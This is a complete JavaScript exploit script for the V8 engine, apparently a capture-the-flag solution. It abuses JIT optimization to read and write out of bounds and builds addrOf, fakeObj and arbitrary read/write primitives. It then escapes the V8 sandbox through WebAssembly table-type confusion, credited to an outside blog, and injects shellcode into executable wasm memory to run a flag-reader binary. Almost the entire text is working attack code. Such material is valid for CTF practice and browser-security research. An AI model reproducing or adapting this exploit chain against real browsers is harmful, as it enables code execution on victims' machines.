// ===============================================
// STARTERS AND UTILS
// ===============================================
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// function dp(x){ %DebugPrint(x); }
// function bp() { %SystemBreak(); }

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// ===============================================
// LEAK MAPS
// ===============================================
var float_arr = [1.2, 1.3, 1.4, 1.4];
var obj_arr = [];
function leak_map(x, arr){
    let idx = 0;

    if (arr.length == 0) {
        return 0;
    }

    if (x == "pwn") {
        idx = 12;
    }
    return arr[idx];
}

// bit brute as well cause, sometimes it doesnt optimize
var tmp = 0x0;
for (var i = 0; i < 0x100000; i++) {
    let t = leak_map("", float_arr);
    tmp += t;
}
console.log("[+] just for the optimization to happen: 0x" + ftoi(tmp).toString(16)); 

firing_range_maps = [2.1, 2.2, 2.3, 2.4];
victim_maps = [2.1, 2.2, 2.3, 2.4];

var float_arr_map  = itof(ftoi(leak_map("pwn", firing_range_maps)) >> 32n);
console.log("[+] float_arr_map: 0x" + ftoi(float_arr_map).toString(16));
var obj_arr_map = itof(ftoi(float_arr_map) - 0x900n);
console.log("[*] obj_arr_map: 0x" + ftoi(obj_arr_map).toString(16));

// ===============================================
// ADDRESS OF PRIMITIVE
// ===============================================
function pre_addrOf(x, arr) {
    let idx = 0;

    if (arr.length == 0) {
        return 0;
    }

    if (x == "pwn") {
        idx = 7;
    }

    return arr[idx];
}

// bit brute as well cause, sometimes it doesnt optimize
var tmp = 0x0;
for (var i = 0; i < 0x100000; i++) {
    let t = pre_addrOf("", float_arr);
    tmp += t;
}
console.log("[+] just for the optimization to happen: 0x" + ftoi(tmp).toString(16)); 

function addrOf(obj) {
    var firing_range_addrof = [3.1, 3.2, 3.3, 3.4];
    var victim_addrof = [{'A': 1}, {'B': 2}];
    victim_addrof[0] = obj;
    
    // dp(firing_range_addrof);
    // dp(obj);
    // bp();
    
    return ftoi(pre_addrOf("pwn", firing_range_addrof)) & 0xffffffffn;
}

// ===============================================
// FAKE OBJECT OF PRIMITIVE
// ===============================================
function pre_fakeObj(x, arr, val) {
    let idx = 0;

    if (arr.length == 0) {
        return 0;
    }

    if (x == "pwn") {
        idx = 9;
    }

    arr[idx] = val;
}

// bit brute as well cause, sometimes it doesnt optimize
var tmp = 0x0;
for (var i = 0; i < 0x100000; i++) {
    let t = pre_fakeObj("", float_arr, 6.9);
    tmp += t;
}
console.log("[+] just for the optimization to happen: 0x" + ftoi(tmp).toString(16)); 

function fakeObj(addr) {
    var float_arr = [1.1, 1.2, 1.3, 1.4];
    var obj = {"A":1};
    var obj_arr = [obj, obj];

    // dp(float_arr);
    // console.log("[*] float_arr: 0x" + addrOf(float_arr).toString(16));
    // console.log("[*] obj: 0x" + addrOf(obj).toString(16));
    // console.log("[*] obj_arr: 0x" + addrOf(obj_arr).toString(16));
    // bp();

    // dp(obj_arr);
    pre_fakeObj("pwn", float_arr, itof(addr));
    
    // console.log("[!] debug: expected obj_arr[0] = 0x" + addr.toString(16)); 
    // bp();

    return obj_arr[0];
}

// ===============================================
// AAR & AAW
// ===============================================
function weak_read(addr) {
    var arb_rw_arr = [(itof(0x725n << 32n)) + (float_arr_map), 1.2, 1.3, 1.4];
    
    // console.log("[*] read_addr: 0x" + addr.toString(16));
    // console.log("[*] arb_rw_arr: 0x" + addrOf(arb_rw_arr).toString(16));
    // dp(arb_rw_arr);
    
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);

    // bp();
    if(fake == undefined) {
        return 0;
    }

    return ftoi(fake[0]);
}

function weak_write(addr, val) {
    var arb_rw_arr = [(itof(0x725n << 32n)) + (float_arr_map), 1.2, 1.3, 1.4];

    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
    fake[0] = itof(val);
}

// ===============================================
// SANDBOX ESCAPE. FROM: https://ptr-yudai.hatenablog.com/entry/2024/07/09/115940
// ===============================================
d8.file.execute("wasm-module-builder.js");

const kHeapObjectTag = 1;
const kWasmTableObjectTypeOffset = 32;
const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
let $mem0 = builder.addMemory(1, 1);

let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let kSig_i_ll = makeSig([kWasmI64, kWasmI64], [kWasmI32]);
let $sig_i_ll = builder.addType(kSig_i_ll);
let $sig_l_l = builder.addType(kSig_l_l);
let $sig_l_v = builder.addType(kSig_l_v);

let $sig_leak = builder.addType(makeSig([kWasmI64, kWasmI64, kWasmI64, kWasmI64, kWasmI64, kWasmI64, kWasmI64, kWasmI64], [kWasmI64]));
let $sig_aar = builder.addType(makeSig([wasmRefType($struct)], [kWasmI64]));
let $sig_aaw = builder.addType(makeSig([wasmRefType($struct), kWasmI64], []));

let $f0 = builder.addFunction("func0", $sig_aaw)
.exportFunc()
.addBody([
    kExprLocalGet, 0,
    kExprLocalGet, 1,
    kGCPrefix, kExprStructSet, $struct, 0,
]);
let $f1 = builder.addFunction("func1", $sig_aar)
.exportFunc()
.addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprStructGet, $struct, 0,
]);
let $f2 = builder.addFunction("func2", $sig_leak)
.exportFunc()
.addBody([
    kExprLocalGet, 0,
]);

let $f = builder.addFunction("f", $sig_i_ll).exportFunc().addBody([
    kExprI32Const, 0,
]);
let $g = builder.addFunction("g", $sig_l_l).exportFunc().addBody([
    kExprI64Const, 0,
]);
let $h = builder.addFunction("h", $sig_l_v).exportFunc().addBody([
    kExprI64Const, 0,
]);

console.log("[*] add table");
let $t0 = builder.addTable(wasmRefType($sig_i_ll), 1, 1, [kExprRefFunc, $f.index]);
builder.addExportOfKind("table0", kExternalTable, $t0.index);
let $t1 = builder.addTable(wasmRefType($sig_l_l), 1, 1, [kExprRefFunc, $g.index]);
builder.addExportOfKind("table1", kExternalTable, $t1.index);
let $t2 = builder.addTable(wasmRefType($sig_l_v), 1, 1, [kExprRefFunc, $h.index]);
builder.addExportOfKind("table2", kExternalTable, $t2.index);

console.log("[*] add primitive func")
builder.addFunction("aaw", kSig_i_ll)
.exportFunc()
.addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,  // func parameter
    kExprI32Const, 0,  // func index
    kExprCallIndirect, $sig_i_ll, 0 /* table num */,
])
builder.addFunction("aar", kSig_l_l)
.exportFunc()
.addBody([
    kExprLocalGet, 0,  // func parameter
    kExprI32Const, 0,  // func index
    kExprCallIndirect, $sig_l_l, 1 /* table num */,
])
builder.addFunction("leak", kSig_l_v)
.exportFunc()
.addBody([
    kExprI32Const, 0,  // func index
    kExprCallIndirect, $sig_l_v, 2 /* table num */,
])

console.log("[*] instantiate");
let instance = builder.instantiate();
let func0 = instance.exports.func0;
let func1 = instance.exports.func1;
let func2 = instance.exports.func2;
let table0 = instance.exports.table0;
let table1 = instance.exports.table1;
let table2 = instance.exports.table2;

let t0 = addrOf(table0);
let t1 = addrOf(table1);
let t2 = addrOf(table2);
console.log("[*] t0: 0x" + t0.toString(16));
console.log("[*] t1: 0x" + t1.toString(16));
console.log("[*] t2: 0x" + t2.toString(16));

let type0 = (($sig_aaw << kHeapTypeShift) | kRef) << kSmiTagSize;
weak_write(t0 + BigInt(kWasmTableObjectTypeOffset - kHeapObjectTag), BigInt(type0));
table0.set(0, func0);

let type1 = (($sig_aar << kHeapTypeShift) | kRef) << kSmiTagSize;
weak_write(t1 + BigInt(kWasmTableObjectTypeOffset - kHeapObjectTag), BigInt(type1));
table1.set(0, func1);

let type2 = (($sig_leak << kHeapTypeShift) | kRef) << kSmiTagSize;
weak_write(t2 + BigInt(kWasmTableObjectTypeOffset - kHeapObjectTag), BigInt(type2));
table2.set(0, func2);

let trusted_data_addr = instance.exports.leak() - 1n;
console.log("[+] trusted data @ " + trusted_data_addr.toString(16));

let addr_rwx = instance.exports.aar(trusted_data_addr + 0x30n - 7n);
console.log("[+] wasm code @ " + addr_rwx.toString(16));

// var getdents_shellcode = [
//     0x9090909090909090n,
//     0x480000002b3d8d48n,
//     0x0002b8d23148f631n,
//     0x48c78948050f0000n,
//     0xb800001337bae689n,
//     0x01bf050f0000004en,
//     0x00000001b8000000n,
//     0x002e050fn,
// ]

// for (let i = 0; i < getdents_shellcode.length; i++) {
//     instance.exports.aaw(addr_rwx + BigInt(0xb69-0x9) + BigInt(i * 8), getdents_shellcode[i]);
// }
// instance.exports.aar(trusted_data_addr, 1n);

var exec_flag_reader_shellcode = [
    0x9090909090909090n,
    0x480000000d3d8d48n,
    0x003bb8d23148f631n,
    0x6d6f682f050f0000n,
    0x6c662f6e77702f65n,
    0x65646165725f6761n,
    0x6166633662322d72n,
    0x3237386633356439n,
    0x6230396337623435n,
    0x6137316432316462n,
    0x003662n,
];

for (let i = 0; i < exec_flag_reader_shellcode.length; i++) {
    instance.exports.aaw(addr_rwx + BigInt(0xb69-0x9) + BigInt(i * 8), exec_flag_reader_shellcode[i]);
}
instance.exports.aar(trusted_data_addr, 1n);
